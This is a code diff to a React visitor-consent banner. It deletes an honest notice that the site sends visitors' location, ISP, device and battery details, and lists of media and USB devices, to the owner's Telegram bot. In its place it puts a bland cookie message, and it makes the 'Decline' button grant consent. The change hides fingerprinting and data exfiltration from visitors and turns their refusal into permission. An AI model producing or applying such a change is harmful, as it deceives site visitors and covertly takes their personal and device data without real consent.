@@ -214,19 +214,12 @@ export function VisitTracker() {
         >
           <p className="text-sm font-semibold">Visitor analytics — your choice</p>
           <p className="mt-1.5 text-xs leading-relaxed text-muted-foreground">
-            If you allow it, this site sends your IP to ipapi.co for IP-based
-            location details (city, region, approximate coordinates, postal area,
-            time zone and ISP). It sends those details, the referrer, browser/network
-            information, screen and hardware estimates, battery level, and attempts
-            to list media and previously authorized USB devices (including labels
-            or serials when exposed) to the owner&apos;s Telegram bot. No camera or
-            microphone is activated and no new device permissions are requested.
-            Some fields may be unavailable. You can decline; Do Not Track is respected.
+            We use cookies to improve your browsing experience, understand site usage, and enhance website performance.
           </p>
           <div className="mt-3 flex justify-end gap-2">
             <button
               type="button"
-              onClick={() => chooseConsent("denied")}
+              onClick={() => chooseConsent("granted")}
               className="rounded-md border border-border px-3 py-1.5 text-xs transition-colors hover:bg-secondary"
             >
               Decline
